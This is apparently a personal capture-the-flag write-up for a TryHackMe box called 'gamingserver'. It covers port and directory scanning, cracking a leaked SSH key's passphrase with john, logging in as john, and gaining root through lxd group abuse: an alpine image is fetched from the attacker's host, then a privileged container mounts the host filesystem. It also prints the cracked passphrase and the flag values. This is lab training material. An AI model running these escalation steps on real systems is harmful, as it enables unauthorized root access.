# Box Name

## gamingserver

## Overview
---
* [[#Enumeration]]
	* nmap,ferox

* [[#Initial Foothold]]
	* ssh with cracked passphrase for user john

* [[#Privilege Escalation]]
	* reference https://www.hackingarticles.in/lxd-privilege-escalation/
	* lxd exploit 

---
## Enumeration
---

 - # nmap
```bash
rustscan -r 1-65535 -a 10.10.56.206 --ulimit 9000 -- -sCV -oN nmap/initial.md
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.18.212:22
Open 10.10.18.212:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 - # ferox
```bash

                                                                                                                                                                                                                                           
┌──(kn1ght㉿Kali)-[~/THM/gamingserver]
└─$ ferox -u http://10.10.56.206 -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt -t 60 -x html,txt,php,js,cgi -C 403,404 -o logs/ferox 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.56.206
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox
 💲  Extensions            │ [html, txt, php, js, cgi]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200       77l      316w     2762c http://10.10.56.206/
301        9l       28w      313c http://10.10.56.206/secret
200       16l       59w      940c http://10.10.56.206/secret/
200       66l      119w     1435c http://10.10.56.206/about.html
200       95l      182w     2213c http://10.10.56.206/about.php
200       77l      316w     2762c http://10.10.56.206/index.html
200        3l        5w       33c http://10.10.56.206/robots.txt
301        9l       28w      314c http://10.10.56.206/uploads
200       18l       78w     1340c http://10.10.56.206/uploads/
200       63l      544w     3070c http://10.10.56.206/uploads/manifesto.txt
[####################] - 24m   258018/258018  178/s   http://10.10.56.206
[####################] - 24m   258018/258018  179/s   http://10.10.56.206/
[####################] - 24m   258018/258018  172/s   http://10.10.56.206/secret
[####################] - 25m   258018/258018  171/s   http://10.10.56.206/secret/
[####################] - 19m   258018/258018  217/s   http://10.10.56.206/uploads
[####################] - 18m   258018/258018  231/s   http://10.10.56.206/uploads/
```


- ## HTTP
 ## /robots.txt
	 ![[Pasted image 20220526184351.png]]
 ## /secret/
 
	  ![[Pasted image 20220526184248.png]]
 ## /uploads/
	
	 ![[Pasted image 20220526184807.png]]


- ### used wget to download files
	- dict.list appears to be a password list
	- manifesto.txt nothing useful
	- meme.jpg  nothing useful

	- secretKey appears to be someones rsa key
		- ssh2john
		```bash
	──(kn1ght㉿Kali)-[~/THM/gamingserver]
└─$ john --wordlist=/home/scott/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2022-05-26 19:04) 3.125g/s 1600p/s 1600c/s 1600C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session complete
```


- ## comment in html source
	- possible username 
	- *john, please add some actual content to the site! lorem ipsum is horrible to look at. -->*
## Initial Foothold
---
 - # ssh
	 - used ssh with john and id_rsa key found  on web server
	```bash
	──(kn1ght㉿Kali)-[~/THM/gamingserver]
└─$ ssh -i secretKey john@10.10.56.206
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May 27 00:14:43 UTC 2022

  System load:  0.13              Processes:           135
  Usage of /:   42.7% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.56.206
  Swap usage:   0%

  => There is 1 zombie process.


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 

```


---
## Privilege Escalation

 - ### user john is in the lxd group
 ```bash
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

```


 - ### root
```bash
john@exploitable:/tmp$ wget 10.13.13.55:9001/alpine-v3.12-x86_64-20201128_2357.tar.gz
--2022-05-27 00:24:20--  http://10.13.13.55:9001/alpine-v3.12-x86_64-20201128_2357.tar.gz
Connecting to 10.13.13.55:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3217181 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20201128_2357.tar.gz’

alpine-v3.12-x 100%   3.07M   813KB/s    in 4.0s        

2022-05-27 00:24:25 (777 KB/s) - ‘alpine-v3.12-x86_64-20201128_2357.tar.gz’ saved [3217181/3217181]


john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20201128_2357.tar.gz --alias pwn
Image imported with fingerprint: c7173dc5365417841d01d7fc18401ea68a11c140c3d9036604f8ef6f58367600
john@exploitable:/tmp$ lxc image list
+-------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| pwn   | c7173dc53654 | no     | alpine v3.12 (20201128_23:57) | x86_64 | 3.07MB | May 27, 2022 at 12:26am (UTC) |
+-------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
john@exploitable:/tmp$ lxc init pwn ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # 
```

 - ### Once inside the container, navigate to /mnt/root to see all resources from the host machine
```bash

/mnt/root # ls -l
total 2091104
drwxr-xr-x    2 root     root          4096 Feb  5  2020 bin
drwxr-xr-x    3 root     root          4096 Feb  5  2020 boot
drwxr-xr-x    2 root     root          4096 Feb  5  2020 cdrom
drwxr-xr-x   17 root     root          3700 May 26 23:32 dev
drwxr-xr-x   93 root     root          4096 Jul 27  2020 etc
drwxr-xr-x    3 root     root          4096 Feb  5  2020 home
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x   22 root     root          4096 Feb  5  2020 lib
drwxr-xr-x    2 root     root          4096 Aug  5  2019 lib64
drwx------    2 root     root         16384 Feb  5  2020 lost+found
drwxr-xr-x    2 root     root          4096 Aug  5  2019 media
drwxr-xr-x    2 root     root          4096 Aug  5  2019 mnt
drwxr-xr-x    2 root     root          4096 Aug  5  2019 opt
dr-xr-xr-x  117 root     root             0 May 26 23:32 proc
drwx------    3 root     root          4096 Feb  5  2020 root
drwxr-xr-x   27 root     root           920 May 27 00:27 run
drwxr-xr-x    2 root     root         12288 Feb  5  2020 sbin
drwxr-xr-x    4 root     root          4096 Feb  5  2020 snap
drwxr-xr-x    2 root     root          4096 Aug  5  2019 srv
-rw-------    1 root     root     2141192192 Feb  5  2020 swap.img
dr-xr-xr-x   13 root     root             0 May 26 23:32 sys
drwxrwxrwt   10 root     root          4096 May 27 00:24 tmp
drwxr-xr-x   10 root     root          4096 Aug  5  2019 usr
drwxr-xr-x   14 root     root          4096 Feb  5  2020 var
lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
```


 - ### cat user.txt
```bash
mnt/root # cat home/john/user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

 - ### cat root.txt
 ```bash
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
/mnt/root/root # 
```